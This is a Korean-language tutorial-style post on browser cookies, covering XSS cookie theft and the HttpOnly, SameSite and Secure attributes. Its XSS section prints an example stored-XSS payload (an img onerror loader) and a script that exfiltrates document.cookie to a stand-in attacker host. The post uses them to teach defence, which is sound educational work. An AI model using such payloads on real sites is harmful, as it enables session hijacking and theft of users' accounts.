# 쿠키란?
쿠키는 웹사이트가 내 브라우저에 저장하는 작은 텍스트 파일입니다.

## 쓰기(저장)

웹사이트가 유저 브라우저에 쿠키를 저장할 수 있습니다. 

예) 쿠팡에 처음 방문하면 쿠팡 서버가 “이 유저에게 ‘user_id=123’라는 쿠키를 저장해줘”라고 유저 브라우저에 요청합니다. 브라우저는 이 정보를 작은 텍스트 파일로 유저 컴퓨터에 저장해둡니다.

## 읽기(접근)

나중에 같은 웹사이트(혹은 크로스 사이트 쿠키인 경우 다른 웹사이트)가 그 쿠키를 읽어갑니다.

예) 다시 쿠팡에 방문하면 유저 쿠키에서 ‘user_id=123’이라는 쿠키를 쿠팡 서버에 전송합니다. 쿠팡은 쿠키를 보고 이 사용자가 또 왔군 인식할 수 있습니다.

## 사용

- 로그인 상태 유지 (세션 쿠키)
- 장바구니 정보 저장
- 사용자 선호도 기억(언어 설정, 다크모드 등)
- 방문 기록 추적
- 광고 타겟팅

# 쿠키 탈취를 막는 보안 방법
쿠키에는 민감한 개인정보들이 담겨있으며, 쿠키를 도둑맞을 경우 유저의 개인정보들을 다른 사람들이 알게 될 수도 있습니다.
HTTP의 Stateless 특성상 식별정보를 쿠키에 저장하는데, 쿠키 정보만 있다면 나쁜 의도를 가진 해커가 다른 유저인척 특정 사이트에 접속할 수 있습니다.

## XSS 공격

쿠키를 훔치는 방법은 다양한데, 대표적인 공격 중 하나가 XSS(Cross Site Scripting)입니다. 

예를 들어 보안 취약점을 알아차린 해커가 아래와 같은 글과 HTML코드가 담긴 게시글을 공개 게시판에 씁니다.

```tsx
[충격] 우리 동네 버스기사 폭행 영상 (클릭해서 보기)

충격적인 영상입니다. 어제 발생한 사건인데요...
<img src="bus_thumbnail.jpg" width="1" height="1" onerror="
  const stealer = document.createElement('script');
  stealer.src = 'https://darkrunner.evil/cookie-stealer.js';
  document.body.appendChild(stealer);
">
많은 사람들이 이 영상을 보고...
```

```tsx
// 사용자의 모든 쿠키 정보 수집
const cookies = document.cookie;

// 이미지 객체를 생성해 정보를 해커의 서버로 전송
// (이미지 요청처럼 보이지만 실제로는 데이터 전송)
const stealerImage = new Image();
stealerImage.src = `https://darkrunner.evil/collect?cookies=${encodeURIComponent(cookies)}&ua=${encodeURIComponent(userAgent)}&page=${encodeURIComponent(currentPage)}&time=${Date.now()}`;

// 사용자가 의심하지 않도록 어떤 시각적 변화도 주지 않음
console.log("영상을 불러오는 중입니다...");
```

제목을 보고 궁금해진 사람들은 게시글을 클릭하지만 올바르지 않은 이미지 로딩으로 에러가 발생하면서 쿠키 탈취 스크립트가 작동합니다.

없는 영상을 계속 요쳥하면서 사용자에게는 영상이 로드되는 것처럼 속이고, 그 와중에 접속한 사람들의 쿠키를 다 훔쳐갈 수 있습니다.

이렇게 탈취한 개인 정보를 가지고 다른 사용자에게 스팸이나 피싱 메시지를 전송하는 등 악용할 수 있습니다. 

이러한 대참사를 막기 위해 `HttpOnly` 속성을 설정하여 JavaScript에서 쿠키에 접근할 수 없도록 해야 합니다.

```tsx
// 사용자의 모든 쿠키 정보 수집
const cookies = document.cookie;
```

`HttpOnly` 속성이 설정되어 있었다면, 위 부분에서 해당 쿠키에 접근하는 것(`document.cookie`)이 불가능합니다.<br />
**`HttpOnly`가 설정된 쿠키는 `document.cookie`를 통해 읽을 수 없습니다.**

인증과 관련된 중요 쿠키에는 항상 `HttpOnly` 속성을 설정하는 것이 보편적입니다.

# 크로스 사이트(Cross Site)와 동일 사이트(Same Site)
유저의 URL과 쿠키의 도메인이 다를 경우 크로스 사이트로 인식됩니다!
## 크로스 사이트 쿠키를 이용하여 쿠팡 광고를 보는 유저
구글링 하는 중에 유저가 전에 방문했던 쿠팡의 광고가 나오는 경우를 생각해봅니다.<br /> 
구글은 자체 쿠키(`google.com` 또는 `doubleclick.net` 등)를 통해 유저의 검색 기록이나 방문사이트를 추적합니다.<br /> 
쿠팡이 구글 광고 네트워크에 광고를 게재하였다면, 유저에게 관련성 있다고 판단된 쿠팡 광고를 구글이 보여줍니다.<br /> 

반대로 이전에 유저가 쿠팡을 방문했고, 쿠팡이 유저의 브라우저에서 자신들의 쿠키를 저장하면(`coupang.com` 도메인의 쿠키) 유저가 구글에서 검색할 때 광고 네트워크가 이 쿠키를 읽어서 쿠팡에 관심이 있으니 쿠팡 광고를 보여주자!고 판단하게 됩니다.<br />
이 두 가지 경우 모두 크로스 사이트 쿠키가 작동한 것입니다. 

## 동일 사이트(Same Site)
동일 사이트(또는 ‘퍼스트 파티’) 컨텍스트에서 쿠키 액세스는 쿠키의 도메인이 유저의 URL과 일치할 때 발생합니다.<br />
동일 사이트 쿠키는 일반적으로 유저가 개별 웹사이트에 로그인한 상태를 유지하고, 환경설정을 기억하며 사이트 분석을 지원하는 데 사용됩니다.

# Same Site 쿠키 설정
크로스 사이트 쿠키(서드 파티 쿠키)를 사용하는 것은 보안에 취약할 수 있습니다.<br />
SameSite 쿠키 설정은 쿠키가 어떤 컨텍스트에서 전송될 수 있는지 제어하는 옵션입니다.<br /> 
이 설정을 통해서 개발자는 자신의 쿠키가 크로스 사이트 요청에서 사용되는 것을 제한할 수 있습니다.<br /> 
(이 속성은 20년도부터 Chrome 브라우저에서 명시적으로 설정해주지 않으면 기본값 `SameSite=Lax;`로 설정되었습니다)

### SameSite=Strict;

가장 엄격한 설정으로, 쿠키는 오직 같은 사이트에서 온 요청에만 전송됩니다. 예를 들어 다른 사이트의 링크를 통해 해당 사이트로 이동할 때도 쿠키가 전송되지 않습니다.

### SameSite=Lax;

약간 덜 엄격한 설정으로, 사용자가 다른 사이트에서 링크를 클릭하여 해당 사이트로 이동할 때는 쿠키가 전송되지만, 이미지나 프레임 로딩과 같은 크로스 사이트 요청에서는 전송되지 않습니다

### SameSite=None;

크로스 사이트 요청에서도 쿠키가 전송될 수 있습니다. 이 옵션을 사용할 때는 반드시 `Secure` 옵션과 함께 설정해야 합니다.(HTTPS 연결에서만 쿠키 전송 허용)

### Secure

`SameSite=None` 옵션을 사용하려면 `Secure` 옵션을 반드시 함께 사용해야 합니다. 

`Secure` 속성은 쿠키가 HTTPS(암호화된 연결)를 통해서만 전송되도록 제한하는 설정입니다. 쿠키에 이 속성이 설정되면, 브라우저에서는 안전한 HTTPS 연결에서만 해당 쿠키를 서버로 전송하고, 일반 HTTP 연결에서는 전송하지 않습니다.

2020년 이후 크롬의 변경사항으로 `SameSite=None`과 반드시 함께 설정해줘야 하는 속성입니다.

![Image](https://github.com/user-attachments/assets/ea89536c-b42a-43c6-a218-29956fe2d427)

# 정리
쿠키 정책은 `HttpOnly`를 통해 자바스크립트에서 쿠키 접근을 차단하고, `SameSite` 속성(Strict, Lax, None)으로 크로스 사이트 요청을 제어하며, `Secure` 속성으로 `HTTPS` 연결에서만 쿠키가 전송되게 해 보안을 강화하는 것이 중요합니다.

---
[Get Ready for New SameSite=None; Secure Cookie Settings  |  Google Search Central Blog  |  Google for Developers](https://developers.google.com/search/blog/2020/01/get-ready-for-new-samesitenone-secure)
[[Web] HTTP Only와 Secure Cookie 이해하기](https://nsinc.tistory.com/121)
